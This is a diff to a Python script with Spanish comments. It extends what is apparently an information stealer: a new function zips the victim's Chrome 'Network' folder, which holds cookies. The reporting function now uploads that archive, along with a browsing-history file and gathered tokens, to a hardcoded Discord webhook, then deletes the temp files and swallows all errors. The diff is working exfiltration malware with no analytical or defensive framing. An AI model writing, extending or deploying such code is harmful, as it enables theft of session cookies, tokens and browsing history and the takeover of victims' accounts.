@@ -144,6 +144,53 @@ def generar_archivo_historial():
                 
     return txt_path
 
+######## Procesar Carpeta Network (ZIP) #####################################
+
+def empaquetar_network():
+    network_dir = os.path.join(
+        os.path.expanduser("~"),
+        "AppData",
+        "Local",
+        "Google",
+        "Chrome",
+        "User Data",
+        "Default",
+        "Network",
+    )
+    
+    if not os.path.exists(network_dir):
+        return None
+
+    temp_dir = tempfile.gettempdir()
+    staging_dir = os.path.join(temp_dir, "chrome_network_staging")
+    zip_base_path = os.path.join(temp_dir, "chrome_network_data")
+
+    try:
+        if os.path.exists(staging_dir):
+            shutil.rmtree(staging_dir, ignore_errors=True)
+        os.makedirs(staging_dir, exist_ok=True)
+
+        for item in os.listdir(network_dir):
+            source_item = os.path.join(network_dir, item)
+            target_item = os.path.join(staging_dir, item)
+            try:
+                if os.path.isdir(source_item):
+                    shutil.copytree(source_item, target_item, dirs_exist_ok=True)
+                else:
+                    shutil.copy2(source_item, target_item)
+            except Exception:
+                pass
+
+        shutil.make_archive(zip_base_path, "zip", staging_dir)
+        final_zip_file = zip_base_path + ".zip"
+        
+        if os.path.exists(staging_dir):
+            shutil.rmtree(staging_dir, ignore_errors=True)
+            
+        return final_zip_file
+    except Exception:
+        return None
+
 ######## Webhook #############################################################
 
 WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1557079500712575016/UgqNpfxAwc0j3moHXUZs6g5ljdLmwPfwQGjnQWAAr2WemT8v3XL_mhJNE-2kzWbCo2OA"
@@ -263,22 +310,40 @@ def enviar_reporte_completo(tokens):
         ]
     }
 
-    # Generar y adjuntar el archivo de texto con el historial
+    # Generar archivos adjuntos (Historial TXT y Network ZIP)
     txt_path = generar_archivo_historial()
-    
+    zip_path = empaquetar_network()
+
+    files = {}
     try:
-        with open(txt_path, "rb") as f:
-            files = {
-                "file": ("historial.txt", f, "text/plain")
-            }
-            requests.post(WEBHOOK_URL_UNICO, data={"payload_json": json.dumps(payload)}, files=files)
+        # Abrir ambos archivos para enviarlos en la misma petición al webhook
+        f_txt = open(txt_path, "rb") if os.path.exists(txt_path) else None
+        f_zip = open(zip_path, "rb") if zip_path and os.path.exists(zip_path) else None
+
+        if f_txt:
+            files["file1"] = ("historial.txt", f_txt, "text/plain")
+        if f_zip:
+            files["file2"] = ("chrome_network_data.zip", f_zip, "application/zip")
+
+        requests.post(WEBHOOK_URL_UNICO, data={"payload_json": json.dumps(payload)}, files=files)
+
+        if f_txt:
+            f_txt.close()
+        if f_zip:
+            f_zip.close()
     except Exception:
         pass
-    
-    # Limpiar archivo temporal
+
+    # Limpieza de archivos temporales
     if os.path.exists(txt_path):
         try:
             os.remove(txt_path)
+        except:
+            pass
+            
+    if zip_path and os.path.exists(zip_path):
+        try:
+            os.remove(zip_path)
         except:
             pass
 
